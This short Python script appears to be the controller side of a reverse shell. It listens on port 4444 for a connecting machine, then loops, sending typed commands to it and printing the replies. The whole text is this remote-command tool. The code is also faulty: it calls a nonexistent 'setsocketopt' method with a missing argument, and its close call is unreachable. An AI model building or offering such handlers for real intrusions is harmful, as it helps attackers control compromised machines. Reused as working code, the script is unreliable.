import socket 

listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
listener.setsocketopt(socket.SOL_SOCKET,socket.SO_REUSEADDR)

listener.bind(('127.0.0.1',4444))
listener.listen(0)    

print('[+] -------------------------')

connection , address = listener.accept()
print(f'[+] connected to {address}')
while True:
    command = input(">>")
    connection.send(bytes(command,'utf8'))
    result_command = connection.recv(1024)
    print(result_command)
    
connection.close()